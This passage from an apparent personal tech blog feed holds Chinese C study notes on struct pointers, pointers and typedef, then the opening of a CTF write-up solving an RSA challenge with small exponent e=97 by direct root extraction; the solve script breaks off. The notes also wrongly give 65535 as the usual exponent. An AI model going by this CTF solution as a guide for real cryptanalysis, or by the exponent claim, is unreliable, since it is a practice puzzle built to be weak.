class="hljs-title">b1</span>;</span><br><span class="hljs-comment">//变量 b1 是一个指针，指向的数据是 struct book 类型的实例。</span><br></code></pre></td></tr></table></figure><h3 id="struct-指针">struct 指针</h3><p>如果将 struct 变量传入函数，函数内部得到的是一个原始值的副本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">turtle</span> &#123;</span><br>  <span class="hljs-type">char</span>* name;<br>  <span class="hljs-type">char</span>* species;<br>  <span class="hljs-type">int</span> age;<br>&#125;;<br><span class="hljs-type">void</span> <span class="hljs-title function_">happy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> turtle t)</span> &#123;<br>  t.age = t.age + <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">turtle</span> <span class="hljs-title">myTurtle</span> =</span> &#123;<span class="hljs-string">&quot;MyTurtle&quot;</span>, <span class="hljs-string">&quot;sea turtle&quot;</span>, <span class="hljs-number">99</span>&#125;;<br>  happy(myTurtle);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Age is %i\n&quot;</span>, myTurtle.age); <span class="hljs-comment">// 输出 99</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面示例中，函数 <code>happy()</code> 传入的是一个<code>struct</code> 变量 <code>myTurtle</code>，函数内部有一个自增操作。但是，执行完 <code>happy()</code>以后，函数外部的 <code>age</code>属性值根本没变。原因就是函数内部得到的是 <code>struct</code>变量的副本， 改变副本影响不到函数外部的原始数据</p><p>通常，希望传入函数的是同一份数据，函数内部修改数据以后，会反映在函数外部。而且，传入的是同一份数据，也有利于提高程序性能。这时就需要将<code>struct</code> 变量的指针传入函数，通过指针来修改<code>struct</code> 属性，就可以影响到函数外部。</p><p><code>struct</code> 指针传入函数的写法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">happy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> turtle* t)</span> &#123;<br>&#125;<br>happy(&amp;myTurtle);<br><span class="hljs-comment">//这里 t 是 struct 结构的指针，调用函数时传入的是指针</span><br><span class="hljs-comment">//struct 类型跟数组不一样，类型标识符本身并不是指针，所以传入时，指针必须写成 &amp;myTurtle 。</span><br></code></pre></td></tr></table></figure><p>函数内部也必须使用 <code>(*t).age</code> 的写法，从指针拿到<code>struct</code> 结构本身：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">happy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> turtle* t)</span> &#123;<br> (*t).age = (*t).age + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面示例中， <code>(*t).age</code> 不能写成 <code>*t.age</code>，因为点运算符 <code>.</code> 的优先级高于 <code>*</code> 。<code>*t.age</code> 这种写法会将 <code>t.age</code>看成一个指针，然后取它对应的值，会出现无法预料的结果。</p><p>现在，重新编译执行上面的整个示例， <code>happy()</code> 内部对<code>struct</code> 结构的操作，就会反映到函数外部。</p><p><code>(*t).age</code> 这样的写法很麻烦。C语言就引入了一个<strong>新的箭头运算符</strong><code>-&gt;</code>，可以从<code>struct</code> 指针上直接 获取属性，大大增强了代码的可读性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">happy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> turtle* t)</span> &#123;<br>  t-&gt;age = t-&gt;age + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结一下，对于 <code>struct</code> 变量名，使用点运算符<code>.</code>获取属性；对于 <code>struct</code> 变量指针，使用箭头运算符<code>-&gt;</code> 获取属性。</p><p>以变量 <code>myStruct</code> 为例，假设 <code>ptr</code>是它的指针，那么下面三种写法是同一回事。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ptr == &amp;myStruct</span><br>myStruct.prop == (*ptr).prop == ptr-&gt;prop<br></code></pre></td></tr></table></figure><h2 id="指针">指针</h2><h3 id="简介">简介</h3><p>指针是什么？首先，它是一个值，这个值代表一个内存地址，因此指针相当于指向某个内存地址的路标。</p><p>字符 <code>*</code>表示指针，通常跟在类型关键字的后面，表示指针指向的是什么类型的值。比如，<code>char*</code> 表示一 个指向字符的指针， <code>float*</code>表示一个指向 <code>float</code> 类型的值的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* intPtr;<br><span class="hljs-comment">//上面示例声明了一个变量 intPtr ，它是一个指针，指向的内存地址存放的是一个整数。</span><br></code></pre></td></tr></table></figure><p>星号 *可以放在变量名与类型关键字之间的任何地方，下面的写法都是有效的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>   *intPtr;<br><span class="hljs-type">int</span> * intPtr;<br><span class="hljs-type">int</span>*  intPtr;<br></code></pre></td></tr></table></figure><p>&amp; 运算符与 * 运算符互为逆运算，下面的表达式总是成立。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> i = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">if</span> (i == *(&amp;i)) <span class="hljs-comment">// 正确</span><br></code></pre></td></tr></table></figure><h3 id="指针变量的初始化">指针变量的初始化</h3><p>声明指针变量之后，编译器会为指针变量本身分配一个内存空间，但是这个内存空间里面的值是随机的，也就是说，指针变量指向的值是随机的。这时一定不能去读写指针变量指向的地址，因为那个地址是随机地址，很可能会导致严重后果。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int* p<span class="hljs-comment">;</span><br>*p <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">; // 错误</span><br></code></pre></td></tr></table></figure><p>上面的代码是错的，因为 p指向的那个地址是随机的，向这个随机地址里面写入 1 ，会导致意想不到的结果。正确做法是指针变量声明后，必须先让它指向一个分配好的地址，然后再进行读写，这叫做指针变量的初始化。</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">int</span>* p<span class="hljs-comment">;</span><br><span class="hljs-keyword">int</span> i<span class="hljs-comment">;</span><br>p = &amp;i<span class="hljs-comment">;</span><br><span class="hljs-symbol">*p</span> = <span class="hljs-number">13</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>上面示例中， p 是指针变量，声明这个变量后， p会指向一个随机的内存地址。这时要将它指向一个已经分配好的内存地址，上例就是再声明一个整数变量 i ，编译器会为 i分配内存地址，然后让 p 指向 i 的内存地址（ <code>p = &amp;i;</code>）。完成初始化之后，就可以对 p 指向的内存地址进行赋值了（<code>*p = 13;</code> ）。</p><h2 id="typedef-命令">typedef 命令</h2><p><code>typedef</code> 命令用来为某个类型起别名。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> type name;<br><span class="hljs-comment">//上面代码中， type 代表类型名，name 代表别名。</span><br></code></pre></td></tr></table></figure><p>比如下面的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> INTEGER;<br>INTEGER a, b;<br>a = <span class="hljs-number">1</span>;<br>b = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p><code>INTEGER a, b;</code>等效于<code>int a, b;</code>。</p><p><code>typedef</code> 可以一次指定多个别名</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">int</span> antelope, bagel, mushroom;<br></code></pre></td></tr></table></figure><p><code>typedef</code> 可以为指针起别名。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span>* intptr;<br><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br>intptr x = &amp;a;<br><span class="hljs-comment">//上面示例中， intptr 是 int* 的别名。不过，使用的时候要小心，这样不容易看出来，变量 x 是一个指针类型。</span><br></code></pre></td></tr></table></figure><p><code>typedef</code> 为<strong>结构体</strong>类型定义别名：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span>&#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">20</span>];<br>    <span class="hljs-type">int</span> age;<br>    <span class="hljs-type">char</span> sex;<br>&#125; STU;<br></code></pre></td></tr></table></figure><p>STU 是 struct stu 的别名，可以用 STU 定义结构体变量：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">STU</span> body1,body2;<br></code></pre></td></tr></table></figure><p>它等价于：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">stu</span> body1, body2;<br></code></pre></td></tr></table></figure><p><code>typedef</code> 也可以用来为数组类型起别名。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> five_ints[<span class="hljs-number">5</span>];<br>five_ints x = &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">55</span>&#125;;<br></code></pre></td></tr></table></figure><p><code>typedef</code> 为函数起别名的写法如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-title function_">char</span> <span class="hljs-params">(*fp)</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-comment">//上面示例中，类型别名 fp 是一个指针，代表函数 signed char (*)(void) 。</span><br></code></pre></td></tr></table></figure><h3 id="主要好处">主要好处</h3><p>（1）更好的代码可读性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span>* STRING;<br>STRING name;<br><span class="hljs-comment">//上面示例为字符指针起别名为 STRING ，以后使用 STRING 声明变量时，就可以轻易辨别该变量是字符串。</span><br></code></pre></td></tr></table></figure><p>（2）为 struct、union、enum等命令定义的复杂数据结构创建别名，从而便于引用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">treenode</span> &#123;</span><br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">treenode</span>* <span class="hljs-title">Tree</span>;</span><br><span class="hljs-comment">//上面示例中， Tree 为 struct treenode* 的别名。</span><br></code></pre></td></tr></table></figure><p><code>typedef</code> 也可以与 <code>struct</code>定义数据类型的命令写在一起</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">animal</span> &#123;</span><br>  <span class="hljs-type">char</span>* name;<br>  <span class="hljs-type">int</span> leg_count, speed;<br>&#125; animal;<br><span class="hljs-comment">//上面示例中，自定义数据类型时，同时使用 typedef 命令，为 struct animal 起了一个别名 animal 。</span><br></code></pre></td></tr></table></figure><p>这种情况下，C 语言允许省略 struct 命令后面的类型名。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">char</span> *name;<br>  <span class="hljs-type">int</span> leg_count, speed;<br>&#125; animal;<br><span class="hljs-comment">//上面示例相当于为一个匿名的数据类型起了别名 animal 。</span><br></code></pre></td></tr></table></figure><p>（3）typedef 方便以后为变量改类型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">float</span> app_float;<br>app_float f1, f2, f3;<br></code></pre></td></tr></table></figure><p>上面示例中，变量 f1 、 f2 、 f3 的类型都是 <code>float</code>。如果以后需要为它们改类型，只需要修改 <code>typedef</code>语句即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">double</span> app_float;<br></code></pre></td></tr></table></figure><p>上面命令将变量 f1 、 f2 、 f3 的类型都改为 <code>long double</code>。</p><h2 id="typedef-和-define-的区别">typedef 和 #define 的区别</h2><p>typedef 在表现上有时候类似于#define，但它和宏替换之间存在一个关键性的区别。正确思考这个问题的方法就是把typedef 看成一种彻底的“封装”类型，声明之后不能再往里面增加别的东西。</p><ol type="1"><li>可以使用其他类型说明符对宏类型名进行扩展，但对 typedef所定义的类型名却不能这样做。如下所示：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> INTERGE int</span><br><span class="hljs-type">unsigned</span> INTERGE n;  <span class="hljs-comment">//没问题</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> INTERGE;<br><span class="hljs-type">unsigned</span> INTERGE n;  <span class="hljs-comment">//错误，不能在 INTERGE 前面添加 unsigned</span><br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>在连续定义几个变量的时候，typedef能够保证定义的所有变量均为同一类型，而 #define 则无法保证。例如：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTR_INT int *</span><br>PTR_INT p1, p2;<br></code></pre></td></tr></table></figure><p>经过宏替换以后，第二行变为：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">int</span> *<span class="hljs-built_in">p1</span>, <span class="hljs-built_in">p2</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这使得 p1、p2 成为不同的类型：p1 是指向 int 类型的指针，p2 是 int类型。</p><p>相反，在下面的代码中：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">typedef<span class="hljs-built_in"> int </span>* PTR_INT<br>PTR_INT p1, p2;<br></code></pre></td></tr></table></figure><p>p1、p2 类型相同，它们都是指向 int 类型的指针。</p><h2 id="其他">其他</h2><p>如果在<code>int</code>型变量的声明中为变量赋应该实数值的初始值（如3.14或5.7等）会怎么样？</p><ul><li>会直接舍去小数部分，只保留整数部分</li></ul><p>单目运算符&amp;（取值运算符）</p><ul><li>&amp;a，取得a的地址（生产指向a的指针）</li></ul><p>单目运算符*（指针运算符）</p><ul><li>*a，a指向的对象</li></ul><p>赋值表达式的左操作数不可以是数组名。</p><p><code>p</code>指向<code>x</code>时，<code>*p</code>是<code>x</code>的别名</p><p>指针<code>p</code>指向数组中的元素<code>e</code>时</p><ul><li><code>p + i</code>为指向元素<code>e</code>后第<code>i</code>个元素的指针</li><li><code>p - i</code>为指向元素<code>e</code>前第<code>i</code>个元素的指针</li><li>指向元素<code>e</code>后第<code>i</code>个元素的<code>*(p + i)</code>，可以写为<code>p[i]</code></li><li>指向元素<code>e</code>前第<code>i</code>个元素的<code>*(p - i)</code>，可以写为<code>p[-i]</code></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230917142303857.png"alt="image-20230917142303857" /><figcaption aria-hidden="true">image-20230917142303857</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230917142327597.png"alt="image-20230917142327597" /><figcaption aria-hidden="true">image-20230917142327597</figcaption></figure><p><code>c</code>语言编译阶段出现如下的问题：</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgc00e0930273a652d2e9d0d0b218eb41.png"alt="c00e0930273a652d2e9d0d0b218eb41" /><figcaptionaria-hidden="true">c00e0930273a652d2e9d0d0b218eb41</figcaption></figure><p>可以检查一下是不是有正在运行的端口没关闭！！！</p>]]></content>
    
    
    
    <tags>
      
      <tag>C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto系列——RSA（二）</title>
    <link href="/2023/09/14/Crypto%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94RSA%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2023/09/14/Crypto%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94RSA%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>《从0开始的密码学世界生活》😋慢慢学密码方向</p><p>2023.09.14-</p><p>2023.10.27,重拾,感觉还是要跟着兴趣走吧😥😭😭😭😭😭😭😭</p><p>2023.11.14 😢</p><h2 id="rsa21小明文攻击">[RSA2]1(小明文攻击)</h2><h3 id="main">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">5120</span>)<br>q = getPrime(<span class="hljs-number">5120</span>)<br><br>n = p*q<br>e = <span class="hljs-number">97</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br>c = powmod(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 1392208858696945158251408085300402884210409327605255122395601049457847957306648819174395014931778575812308192875319127224095733396726388842605854427013313599830150182564652493067830031524869535522568868597852507293377043240832819715539722122306829543983051745406887140154364256267942350230636870212935356815475345989038318923389132101208917912083817520799490534351545373438629367819085151041702754019127891155542476560972125790519584018715794669416759039955180436830478697704458250990786586357019211642837879273967620287257818400267757312623543898635740200839249361087580046496969637043238450499583879116276661827372750638403042213043389905183760455450595752578482968202040860053524276678108325784161897719093223308370971388068813420487879756084379519128232693549989942550047529174783976176943482484756074638704076740157397067892580297182979526978967352014250386678155843772313996171396582929433057131989693861316408604436872931427368192437680361830753162284661119995125858203931094922686321756465463988790748131178263745308042820480140189644732824717255521633534750635979508673908361269979175726073254050574688259969290376926807033728165164896588540691889207252105903436659968119091774687841336252628343233161941187968365128093917171537997137001140227677728923114895809278926486615010954871408034272872411042537353956193868948909981683850857262457369506288525323882308421700421661036191853577105238753230479541719001794464585534292774768292358961920606891227776349593589481547577148801600196035588544512224775960892265021565124673788852875005526313525709353599584812394138968970647681759439523307392275602626903789154682706839530654070108096741181206975334567778238856983205004289416400671597321919876279909765650782227834097342294844294386380646928266942749144240020420237153276705785759403019072953506982997681174635673907151856644499332322321579088035719680421458310273802481031746012298208449699089203065699598926690947025679591160106357130634946357609420125223580319677387654711233585375013067828291928349946599077331636017784447090096340360087970540477975170379810969501197027775838769222713506443846417124839450184827707739588007707714623211453528342755023849716924694572679150284882978804641986457119009272574734697043321033091757474387114449914271460113979531460465175717705674905568446670579332667139075523255580471183372714211547822093365025438653384719374474230360983878837077517864405475258349436531094649276628214288499716485354283135575921258757214288792410583835467572916298688718758374714560819702413058421373661892101033513816116981698045524150518509405086125781764762145577981637953775680403132163846782252745029783387112660812179706752454175492501665442704630131729362621965258498471247871904163412798544329515689112368523703890083138721480476796720323855371775568097188216621368341228806795058046403892301673157631331636430392885315997250027372621883549649614866115616619234953579196607399899485002042456482969222428121605212017146571466818179341621066715472184636758016242256725063854155219754299817717414423725704356940589670902509021070871847017199593680033</span><br><span class="hljs-string">e = 97</span><br><span class="hljs-string">c = 79418540691422578656139651796213224829563266521211325595707569487401417030874358531413674275017334363641194166574500833916574827523075402219754470871728896772312056257743844227927800121160288525434484105786180547178403828613331285574461293211150728313415280329153597549251599876668080073528625299164784405291297754331374420687599875173508778209038236713812747215157059659564867241144529476211694011692007565732793105429228730285249025627762831080251661835294067942958070742202862164086250986988784472568266652325462247009294865764533077164470382743735937483173523682749295196383707694876943634298051820105410771024861599560176707940488888601355473498847493259474613261665538825299531665650233837474894442826242097663456648233384047622152817959729025415665280499618951478005159820575701483220155180955748454167435711033379910310483689839303198822665341421591234243891877857520663120183063591818656508336831518527692847950877186870610083654117153248336928856886934232488927132245720058243202637258025864487122393335118118013444397135476780564523166548571927547341556616683070253790368891423731046742936358877118104790084195711730135202600692806999992373490439385845158780392894927697171401722699273071306493916233696254958735540772870249139252741670476667099529502282392011715616110876451102234600267482991583515122052976378641894214562203326290939184469206074418127906704847146567350085797480500249400491003993809769407575997740985283755035509654310797061339563655229926356893455738361409861102662109994984398860070584568014471082484198504331014073023689622378943694856212172718725529473812336321642429261822836311084518735006587545920946664595488768239633950124822001162595168106106356115962424210028401369438479550293237915944302351566624339603616714683958384871326105542659559877758488581425288668613061792514360263277530824203967659102107889148367539858141289229124274098921748855341045565232484417195620758495861456624842263649414501657786484816662971421962216348340311859717286253287173293151613310383128702607971580042308515018120559903265609733911340589091613087560931098833849573462572181625894166772788435459280323623477689159384354671220634694792005231505741029567734616435905915192606539962414882105254409847885996949466940350184140166614950171110955365828033747003120697209120916652982201967537088553504504252785632280900095976870510754563400828951684036526240669112248351928072177486091157562600003336544767896806392523395037345770580482363058065676920013089896399387769312374871419827762872050800055872960573607645266626972865053489632548224840580503746879607167797904430560935476705014800973841917939689270919224595772574781478285359220463175042728750523639669204218676238297875644055563803457896409252533724486937378974745777400567080239687055154021761534918106133195512030935957251049812753269173090858930245212145938555697547499155977225759702066548720079477737104010668116693232798415289735481194922014811945312893853446826780868861295203942063380964100360870361328125</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp">exp</h3><ul class="task-list"><li><label><input type="checkbox"checked="" /><strong>小明文攻击</strong></label></li></ul><p><strong>加密指数指的是e，e一般取65535，但当e很小时，可直接解密</strong></p><p>这里<strong>$ m^{e} &lt; c$</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">1392208858696945158251408085300402884210409327605255122395601049457847957306648819174395014931778575812308192875319127224095733396726388842605854427013313599830150182564652493067830031524869535522568868597852507293377043240832819715539722122306829543983051745406887140154364256267942350230636870212935356815475345989038318923389132101208917912083817520799490534351545373438629367819085151041702754019127891155542476560972125790519584018715794669416759039955180436830478697704458250990786586357019211642837879273967620287257818400267757312623543898635740200839249361087580046496969637043238450499583879116276661827372750638403042213043389905183760455450595752578482968202040860053524276678108325784161897719093223308370971388068813420487879756084379519128232693549989942550047529174783976176943482484756074638704076740157397067892580297182979526978967352014250386678155843772313996171396582929433057131989693861316408604436872931427368192437680361830753162284661119995125858203931094922686321756465463988790748131178263745308042820480140189644732824717255521633534750635979508673908361269979175726073254050574688259969290376926807033728165164896588540691889207252105903436659968119091774687841336252628343233161941187968365128093917171537997137001140227677728923114895809278926486615010954871408034272872411042537353956193868948909981683850857262457369506288525323882308421700421661036191853577105238753230479541719001794464585534292774768292358961920606891227776349593589481547577148801600196035588544512224775960892265021565124673788852875005526313525709353599584812394138968970647681759439523307392275602626903789154682706839530654070108096741181206975334567778238856983205004289416400671597321919876279909765650782227834097342294844294386380646928266942749144240020420237153276705785759403019072953506982997681174635673907151856644499332322321579088035719680421458310273802481031746012298208449699089203065699598926690947025679591160106357130634946357609420125223580319677387654711233585375013067828291928349946599077331636017784447090096340360087970540477975170379810969501197027775838769222713506443846417124839450184827707739588007707714623211453528342755023849716924694572679150284882978804641986457119009272574734697043321033091757474387114449914271460113979531460465175717705674905568446670579332667139075523255580471183372714211547822093365025438653384719374474230360983878837077517864405475258349436531094649276628214288499716485354283135575921258757214288792410583835467572916298688718758374714560819702413058421373661892101033513816116981698045524150518509405086125781764762145577981637953775680403132163846782252745029783387112660812179706752454175492501665442704630131729362621965258498471247871904163412798544329515689112368523703890083138721480476796720323855371775568097188216621368341228806795058046403892301673157631331636430392885315997250027372621883549649614866115616619234953579196607399899485002042456482969222428121605212017146571466818179341621066715472184636758016242256725063854155219754299817717414423725704356940589670902509021070871847017199593680033</span><br>e = <span class="hljs-number">97</span><br>c = <span 